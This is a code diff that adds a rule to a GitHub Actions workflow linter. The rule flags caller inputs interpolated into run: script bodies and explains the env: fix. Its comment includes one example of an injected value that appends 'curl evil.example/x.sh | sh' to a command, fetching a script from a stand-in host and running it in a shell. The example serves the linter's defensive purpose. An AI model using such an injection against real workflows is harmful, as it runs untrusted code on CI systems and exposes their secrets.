@@ -333,6 +333,37 @@ export function analyzeSource(text, { file = '<input>' } = {}) {
     }
   }
 
+  // Rule 7 — no input interpolation in run bodies.
+  //
+  // GitHub substitutes `${{ inputs.* }}` into the script body *before* bash
+  // parses it, so any shell metacharacter in the input executes. A `command`
+  // of `test:e2e:smoke; curl evil.example/x.sh | sh` runs the suite, then
+  // pipes a downloaded script into a shell. The value is set by the consuming
+  // repository's workflow file, so this is not a privilege boundary crossing
+  // today — but it becomes one the moment any workflow builds the value from
+  // something less trusted (a `workflow_dispatch` input, a matrix value
+  // derived from a branch name, a repository variable).
+  //
+  // The fix is to route the value through the environment instead of the
+  // script body: `env: COMMAND: ${{ inputs.command }}` with `run: npm run
+  // "$COMMAND"`. The env block is evaluated by GitHub's expression engine and
+  // written to the container's environment; bash reads the value at runtime,
+  // where quoting prevents word-splitting and glob expansion.
+  //
+  // `steps.*.outputs.*` is allowed — those values are produced by the workflow
+  // itself, not by a caller. `secrets.*` is also allowed for the same reason.
+  for (const { value, path } of runSteps) {
+    for (const expression of value.matchAll(EXPRESSION)) {
+      for (const input of inputReferences(expression[1])) {
+        report(
+          'no-inputs-in-run-body',
+          `\`inputs.${input}\` is interpolated into a \`run:\` body, where GitHub substitutes it before bash parses the script; route it through \`env:\` instead and reference \`"$${input.toUpperCase().replace(/-/g, '_')}"\``,
+          path,
+        )
+      }
+    }
+  }
+
   // Rule 6 — artifact names must not interpolate an input.
   //
   // `upload-artifact` rejects `" : < > | * ? \r \n \ /` in a name outright,
